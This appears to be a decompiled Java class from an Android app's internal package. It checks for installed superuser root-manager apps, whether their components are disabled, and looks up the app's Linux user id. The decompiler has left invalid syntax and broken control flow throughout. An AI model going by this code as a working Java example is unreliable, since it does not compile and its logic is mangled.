package com.vvt.ab;

import android.content.ComponentName;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.util.Log;
import com.vvt.ag.b;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

public class e
{
  private static boolean a = com.vvt.ak.a.a;
  private static boolean b = com.vvt.ak.a.e;
  private static String c = "PackageUtil";
  private static String d = "";
  
  public static List a()
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    localArrayList.add("com.noshufou.android.su");
    localArrayList.add("eu.chainfire.supersu");
    localArrayList.add("com.koushikdutta.superuser");
    localArrayList.add("com.m0narx.su");
    return localArrayList;
  }
  
  public static boolean a(Context paramContext)
  {
    boolean bool1 = false;
    boolean bool2 = a;
    if (bool2) {}
    for (;;)
    {
      try
      {
        localPackageManager = paramContext.getPackageManager();
        int i = 128;
        localObject1 = localPackageManager.getInstalledApplications(i);
        localObject3 = null;
        localObject4 = new java/util/ArrayList;
        ((ArrayList)localObject4).<init>();
        localObject5 = ((List)localObject1).iterator();
        boolean bool3 = ((Iterator)localObject5).hasNext();
        if (bool3)
        {
          localObject1 = ((Iterator)localObject5).next();
          localObject1 = (ApplicationInfo)localObject1;
          str1 = ((ApplicationInfo)localObject1).packageName;
          str2 = "com.noshufou.android.su";
          bool6 = str1.equalsIgnoreCase(str2);
          if (!bool6) {
            continue;
          }
          localObject1 = "com.noshufou.android.su";
          localObject3 = "com.noshufou.android.su.Su";
          ((List)localObject4).add(localObject3);
          localObject3 = localObject1;
        }
        bool3 = b.a((String)localObject3);
        if (bool3) {
          continue;
        }
        int j = ((List)localObject4).size();
        if (j <= 0) {
          continue;
        }
        bool4 = a;
        if (bool4) {}
        localObject4 = ((List)localObject4).iterator();
      }
      catch (Exception localException1)
      {
        PackageManager localPackageManager;
        Object localObject1;
        Object localObject3;
        Object localObject4;
        Object localObject5;
        String str1;
        String str2;
        boolean bool6;
        boolean bool4;
        boolean bool5 = b;
        if (!bool5) {
          continue;
        }
        bool5 = false;
        Object localObject2 = null;
        continue;
        continue;
      }
      bool4 = ((Iterator)localObject4).hasNext();
      if (!bool4) {
        continue;
      }
      localObject1 = ((Iterator)localObject4).next();
      localObject1 = (String)localObject1;
      try
      {
        localObject5 = new android/content/ComponentName;
        ((ComponentName)localObject5).<init>((String)localObject3, (String)localObject1);
        int k = localPackageManager.getComponentEnabledSetting((ComponentName)localObject5);
        int m = 2;
        if (m != k) {
          continue;
        }
        k = 1;
        bool1 = a;
        if (bool1) {}
        bool1 = a;
        if (bool1) {}
        return k;
      }
      catch (Exception localException2) {}
      str1 = ((ApplicationInfo)localObject1).packageName;
      str2 = "eu.chainfire.supersu";
      bool6 = str1.equalsIgnoreCase(str2);
      if (bool6)
      {
        localObject1 = "eu.chainfire.supersu";
        localObject3 = "eu.chainfire.supersu.MainActivity";
        ((List)localObject4).add(localObject3);
        localObject3 = "eu.chainfire.supersu.MainActivity-Emblem";
        ((List)localObject4).add(localObject3);
        localObject3 = "eu.chainfire.supersu.MainActivity-Material";
        ((List)localObject4).add(localObject3);
        localObject3 = localObject1;
      }
      else
      {
        str1 = ((ApplicationInfo)localObject1).packageName;
        str2 = "com.koushikdutta.superuser";
        bool6 = str1.equalsIgnoreCase(str2);
        if (bool6)
        {
          localObject1 = "com.koushikdutta.superuser";
          localObject3 = "com.koushikdutta.superuser.MainActivity";
          ((List)localObject4).add(localObject3);
          localObject3 = localObject1;
        }
        else
        {
          localObject1 = ((ApplicationInfo)localObject1).packageName;
          str1 = "com.m0narx.su";
          bool5 = ((String)localObject1).equalsIgnoreCase(str1);
          if (bool5)
          {
            localObject1 = "com.m0narx.su";
            localObject3 = "com.m0narx.su.Su";
            ((List)localObject4).add(localObject3);
            localObject3 = localObject1;
          }
        }
      }
    }
  }
  
  public static boolean a(Context paramContext, String paramString)
  {
    PackageManager localPackageManager = paramContext.getPackageManager();
    int i = 128;
    try
    {
      localPackageManager.getPackageInfo(paramString, i);
      bool = true;
    }
    catch (PackageManager.NameNotFoundException localNameNotFoundException)
    {
      for (;;)
      {
        boolean bool = false;
        Object localObject = null;
      }
    }
    return bool;
  }
  
  public static boolean a(Context paramContext, String paramString, int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    Thread localThread = new java/lang/Thread;
    f localf = new com/vvt/ab/f;
    localf.<init>(paramContext, paramString);
    localThread.<init>(localf);
    long l = paramInt;
    boolean bool2 = com.vvt.ai.a.a(localThread, l);
    if (bool2) {
      localThread.interrupt();
    }
    return bool2;
  }
  
  public static String b(Context paramContext)
  {
    try
    {
      Object localObject1 = d;
      boolean bool1 = b.a((String)localObject1);
      if (bool1)
      {
        localObject1 = paramContext.getPackageManager();
        localObject2 = paramContext.getPackageName();
        int j = 128;
        localObject1 = ((PackageManager)localObject1).getInstalledApplications(j);
        localObject3 = ((List)localObject1).iterator();
        boolean bool3;
        do
        {
          bool1 = ((Iterator)localObject3).hasNext();
          if (!bool1) {
            break;
          }
          localObject1 = ((Iterator)localObject3).next();
          localObject1 = (ApplicationInfo)localObject1;
          String str = ((ApplicationInfo)localObject1).packageName;
          bool3 = str.equals(localObject2);
        } while (!bool3);
        int i = ((ApplicationInfo)localObject1).uid;
        localObject1 = a.a(i);
        d = (String)localObject1;
      }
      boolean bool2 = a;
      if (bool2)
      {
        localObject1 = c;
        localObject2 = new java/lang/StringBuilder;
        ((StringBuilder)localObject2).<init>();
        localObject3 = "getAppLinuxUserId # ";
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
        localObject3 = d;
        localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
        localObject2 = ((StringBuilder)localObject2).toString();
        Log.v((String)localObject1, (String)localObject2);
      }
    }
    finally
    {
      for (;;)
      {
        Object localObject3;
        Object localObject2 = "";
        d = (String)localObject2;
        boolean bool4 = b;
        if (bool4)
        {
          localObject2 = c;
          localObject3 = "getAppLinuxUserId # err";
          Log.e((String)localObject2, (String)localObject3, localThrowable);
        }
      }
    }
    return d;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/ab/e.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */